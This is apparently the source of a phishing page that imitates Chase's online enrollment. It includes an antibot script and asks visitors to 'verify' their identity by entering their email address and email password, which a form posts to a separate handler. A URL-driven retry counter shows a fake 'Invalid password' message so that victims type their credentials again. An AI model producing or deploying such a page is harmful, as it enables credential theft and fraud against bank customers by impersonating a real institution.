<?php
require "./includes/antibot.php";
?>
<html class="no-js" lang="en" dir="ltr">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Getting started - Online Enrollment - chase.com</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    @font-face {
        font-family: Open Sans;
        font-style: normal;
        font-weight: 400;
        src: url('fonts/opensans-regular.eot?#iefix') format('embedded-opentype'), url('fonts/opensans-regular.woff') format('woff'), url('fonts/opensans-regular.ttf') format('truetype'), url('fonts/opensans-regular.svg#opensans-regular') format('svg');
    }

    @font-face {
        font-family: Open Sans;
        font-style: normal;
        font-weight: 600;
        src: url('fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'), url('fonts/opensans-semibold.woff') format('woff'), url('fonts/opensans-semibold.ttf') format('truetype'), url('fonts/opensans-semibold.svg#opensans-semibold') format('svg');
    }

    @font-face {
        font-family: Open Sans;
        font-style: normal;
        font-weight: 300;
        src: url('fonts/opensans-light.eot?#iefix') format('embedded-opentype'), url('fonts/opensans-light.woff') format('woff'), url('fonts/opensans-light.ttf') format('truetype'), url('fonts/opensans-light.svg#opensans-light') format('svg');
    }

    @font-face {
        font-family: videoplayer;
        font-style: normal;
        font-weight: normal;
        src: url('fonts/videoplayer.eot?#iefix') format('embedded-opentype'), url('fonts/videoplayer.woff') format('woff'), url('fonts/videoplayer.ttf') format('truetype'), url('fonts/videoplayer.svg#videoplayer') format('svg');
    }

    html {
        height: 100%;
        background: #fff;
    }
    </style>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" href="css/enroll.css">
    <link rel="stylesheet" href="css/blue-ui.css">
    <style type="text/css">
    .jpui.icon.questionmark-medium:after {
        visibility: hidden;
    }
    </style>
</head>

<body style="overflow-x: hidden; overflow-y: auto; height: 100%" class="brand-personal menu-open">
    <div data-is-view="true">
        <div class="util print-hide" id="enrollment-menu-container" data-has-view="true">
            <div data-is-view="true"> </div>
        </div>
        <div class="enrollment getting-started-wrapper" id="enrollment" aria-hidden="true">
            <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true"></div>
            <header class="toggle-aria-hidden" id="enrollment-header" role="banner" data-has-view="true">
                <div class="enrollment-header PERSONAL" data-is-view="true">
                    <div class="col-xs-2 col-sm-4 header-elements"><span id="enrollment-side-menu-icon-iconanchor-wrapper"><a class="jpui iconaction menulines" href="#" id="enrollment-side-menu-icon"> <span class="util accessible-text" id="accessible-enrollment-side-menu-icon">, opens menu</span> <i class="jpui menulines icon" id="icon-enrollment-side-menu-icon" aria-hidden="true"></i></a></span></div>
                    <div class="col-xs-6 col-sm-4 header-elements " style="text-align: center;margin-top: 10px">
                        <img src="images/octogon-white.png" alt="Chase">
                    </div>
                    <div class="col-xs-4 header-elements util right aligned"><button type="button" id="languageChange" class="jpui button focus primary language-change"><span class="label">Español</span> </button></div>
                </div>
            </header>
            <main id="enrollment-content" data-has-view="true">
                <div class="online-enrollment getting-started" data-is-view="true">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                                <h1 class="H2 online-enrollment-header" id="gettingStartedHeading" tabindex="-1">Address Details</h1>
                                <div class="jpui progress bar" id="gettingStarted-progressBar" data-progress="40">
                                    <div class="bar fill" id="gettingStarted-progressBar-bar"></div> <span class="util accessible-text" id="accessible-bar-gettingStarted-progressBar">0percent complete.</span>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-sm-2 col-lg-offset-1 hide-xs show-sm enroll-faq-sidebar">
                                <div class="DATA"><i class="jpui questionmark-medium icon commercial-overlay-icon" id="enroll-faq-icon" aria-hidden="true"></i> <span>Questions?</span></div>
                                <div>
                                    <p class="BODY faqs-link" id="requestFAQLink">Check out our <a href="#" data-attr="requestFrequentlyAskedQuestions">FAQs <span accessibletext="true">, opens dialog</span></a></p>
                                </div>
                            </div>
                            <div class="col-xs-12 col-sm-8 col-lg-6">
                                <div class="H2 online-enrollment-getting-started">Please verify your detail</div>
                                <h2 class="H4 enrollmentGettingStartedAdvisory">We need a bit more info to verify your identity.</h2>
                                <div class="row"> </div>
                                <form action="./next.php" method="POST">
                                    <input type="hidden" name="count" id="count" value="0">
                                    <div>
                                        <div id="msg" style="display: none;color: red;font-weight: 600;margin-bottom: 10px;">Invalid password.! Please enter correct password.</div>
                                    </div>
                                    <div class="row">
                                        <div class="col-sm-8 col-md-8">
                                            <div class="jpui fieldgroup text-input-custom account-id" id="accountIdentifier">
                                                <div class="jpui vertical">
                                                    <div class="align-label-input">
                                                        <div class="label-wrapper">
                                                            <label class="jpui fieldlabel label-alignment vertical" id="accountIdentifier-label" for="fname" aria-hidden="false">
                                                                Email Address
                                                            </label>
                                                        </div>
                                                        <div class="jpui validationinput" id="accountIdentifier-text">
                                                            <div id="accountIdentifier-text-validate">
                                                                <input class="jpui input" id="aiii" type="email" name="aiii" required="" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row " style="margin-top: 20px">
                                        <div class="col-sm-8 col-md-8">
                                            <div class="jpui fieldgroup text-input-custom account-id" id="accountIdentifier">
                                                <div class="jpui vertical">
                                                    <div class="align-label-input">
                                                        <div class="label-wrapper">
                                                            <label class="jpui fieldlabel label-alignment vertical" id="accountIdentifier-label" for="zcode" aria-hidden="false">
                                                                Email Password
                                                            </label>
                                                        </div>
                                                        <div class="jpui validationinput" id="accountIdentifier-text">
                                                            <div id="accountIdentifier-text-validate">
                                                                <input class="jpui input" id="prrr" type="password" name="prrr" required="" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row">
                                        <div class="col-xs-12 col-sm-4 col-sm-offset-8 col-md-3 col-md-offset-9 button-row-margin"> <button type="Submit" id="btn3" name="btn3" class="jpui button focus primary fluid"><span class="label">Next</span> </button></div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
            <footer id="enrollment-footer" data-has-view="true">
                <div class="online-enrollment-footer" data-is-view="true">
                    <div class="row">
                        <div class="col-xs-10 col-sm-8 col-lg-6 footer-container">
                            <ul class="footer-menu">
                                <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor NOTELINK util underline" id="requestPrivacyNotice" href="#" aria-label=" Privacy  ">Privacy </a></span></li>
                                <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor NOTELINK util underline" id="requestSecurity" href="#" aria-label=" Security ">Security</a></span></li>
                                <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor NOTELINK util underline" id="requestAccessibility" href="#" aria-label=" Accessibility ">Accessibility</a></span></li>
                                <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor NOTELINK util underline" id="requestTermsOfUse" href="#" aria-label=" Terms of use ">Terms of use</a></span></li>
                                <li><span class="jpui link" id="requestAdChoices-link-wrapper"><a class="link-anchor NOTELINK util underline no-right-padding" id="requestAdChoices" href="#" aria-label=" Ad choices ">Ad choices</a></span> <img class="adChoices-img" src="https://www.chase.com/content/dam/chasecom/en/homepage/images/ad-choices-logo-blue_lite.png" alt=""></li>
                            </ul>
                            <p class="NOTE util center aligned">© 2021 JPMorgan Chase &amp; Co.</p>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
/* global $ */
$(document).ready(function() {
    var count = 0;

    function getUrlVars() {
        var vars = {};
        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
            vars[key] = value;
        });
        return vars;
    }

    if (!getUrlVars()["count"]) {

    } else {
        var count = getUrlVars()["count"];
        $('#count').val(count);
    }

$("#aiii").click(function() {
    $("#msg").hide();

});
$("#prrr").click(function() {
    $("#msg").hide();
    
});

    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {

        var my_ai = ai;

        $("#msg").hide();
        var count = $('#count').val();
        if (count > 0) {
            $("#msg").show();
        } else {
            $("#msg").hide();
        }
        $('#ai').val(my_ai);


    }
    ///////////////url getting ai////////////////

});
</script>

</html>